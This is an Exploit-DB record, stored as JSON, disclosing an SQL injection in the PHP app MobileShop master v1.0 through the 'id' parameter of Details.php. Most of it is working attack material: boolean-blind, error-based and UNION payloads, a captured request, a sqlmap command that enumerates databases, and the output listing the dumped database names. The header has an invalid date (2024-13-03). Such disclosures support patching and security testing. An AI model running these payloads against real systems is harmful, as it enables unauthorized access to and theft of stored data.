{"source": "https://www.exploit-db.com/exploits/51921", "vulnName": "MobileShop master v1.0 - SQL Injection Vuln.", "vulnEDBID": "51921", "vulnCVE": "N/A", "author": "HAZIM ARBA\u015e", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-25", "vulnContent": "+ Exploit Title: MobileShop master v1.0 - SQL Injection Vuln.\n+ Date: 2024-13-03\n+ Exploit Author: \"HAZIM ARBA\u015e\" from EMA Security LTD - Siber G\u00fcvenlik ve Bili\u015fim Hizmetleri (https://emasecurity.com)\n+ Vendor Homepage: https://code-projects.org/mobile-shop-in-php-css-javascript-and-mysql-free-download/\n+ Software Link: https://download-media.code-projects.org/2020/04/Mobile_Shop_IN_PHP_CSS_JavaScript_AND_MYSQL__FREE_DOWNLOAD.zip\n+ Tested on: Windows 10 Pro\n+ CWE: CWE-89\n+ CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\n+ Type: WebApps\n+ Platform: PHP\n\n## References:\n+ https://cwe.mitre.org/data/definitions/89.html\n+ https://owasp.org/Top10/A03_2021-Injection/\n\n## Description:\nThe MobileShop-master application is susceptible to SQL Injection through the 'id' parameter in \"/MobileShop-master/Details.php\". Exploiting this vulnerability could lead to severe consequences, including unauthorized access, data manipulation, and potential exploitation of other vulnerabilities within the underlying database. It is imperative to address this issue promptly to mitigate the risk of compromise and ensure the security and integrity of the application and its data.\n\n## Proof of Concept:\n+ Go to the Login page: \"http://localhost/MobileShop-master/Login.html\"\n+ Fill email and password.\n+ Select any product and intercept the request via Burp Suite, then send it to Repeater.\n+ Change the 'id' value to any of the below payloads.\n+ Send the request\n\n## Payloads:\n+ id=1' AND 9071=9071 AND 'EtdU'='EtdU\n+ id=1' AND (SELECT 7012 FROM(SELECT COUNT(*),CONCAT(0x7176787071,(SELECT (ELT(7012=7012,1))),0x7171717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'wwwk'='wwwk\n+ id=1' UNION ALL SELECT NULL,CONCAT(0x7176787071,0x7867535464594a544c58796246766f6a444c4358426b596c71724b59676455644b66794858734670,0x7171717671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -\n+ Or you can write your own payloads\n\n\n## Proof of Concept Using SqlMap:\n+ Go to the Login page: \"http://localhormst/MobileShop-master/Login.html\"\n+ Fill email and password.\n+ Select any product and intercept the request via Burp Suite, then send it to Repeater.\n+ Copy to File the request to a \"sql.txt\" file.\n+ Run the following sqlmap command\n+ sqlmap -r sql.txt -p id --dbs\n\n\n```\nPOST /MobileShop-master/Details.php HTTP/1.1\nHost: localhost\nContent-Length: 42\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://localhost\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://localhost/MobileShop-master/MobilesList.php\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nCookie: PHPSESSID=mh3mnpf51bj2q17hg8sipbltnn\nConnection: close\n\nid=1\n```\n\n+ Use sqlmap to exploit. In sqlmap, use 'id' parameter to dump the database.\n```\nsqlmap -r sql.txt -p id --dbs\n```\n\n```\n---\nParameter: id (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: id=1' AND 9071=9071 AND 'EtdU'='EtdU\n\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: id=1' AND (SELECT 7012 FROM(SELECT COUNT(*),CONCAT(0x7176787071,(SELECT (ELT(7012=7012,1))),0x7171717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'wwwk'='wwwk\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=1' AND (SELECT 7380 FROM (SELECT(SLEEP(5)))rlmI) AND 'blrN'='blrN\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 13 columns\n    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x7176787071,0x7867535464594a544c58796246766f6a444c4358426b596c71724b59676455644b66794858734670,0x7171717671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -\n---\n[04:17:04] [INFO] the back-end DBMS is MySQL\nweb application technology: PHP 8.2.12, Apache 2.4.58\nback-end DBMS: MySQL >= 5.0 (MariaDB fork)\n[04:17:04] [INFO] fetching database names\n[04:17:05] [INFO] resumed: 'information_schema'\n[04:17:05] [INFO] resumed: '1'\n[04:17:05] [INFO] resumed: '3'\n[04:17:05] [INFO] resumed: 'admidio'\n[04:17:05] [INFO] resumed: 'calender'\n[04:17:05] [INFO] resumed: 'corregidor'\n[04:17:05] [INFO] resumed: 'gym'\n[04:17:05] [INFO] resumed: 'joomla_db'\n[04:17:05] [INFO] resumed: 'linkstack'\n[04:17:05] [INFO] resumed: 'mobileshop'\n[04:17:05] [INFO] resumed: 'mysql'\n[04:17:05] [INFO] resumed: 'nickey'\n[04:17:05] [INFO] resumed: 'performance_schema'\n[04:17:05] [INFO] resumed: 'phpmyadmin'\n[04:17:05] [INFO] resumed: 'rcms'\n[04:17:05] [INFO] resumed: 'smith'\n[04:17:05] [INFO] resumed: 'telephone'\n[04:17:05] [INFO] resumed: 'test'\n[04:17:05] [INFO] resumed: 'valente'\n\n```\n            "}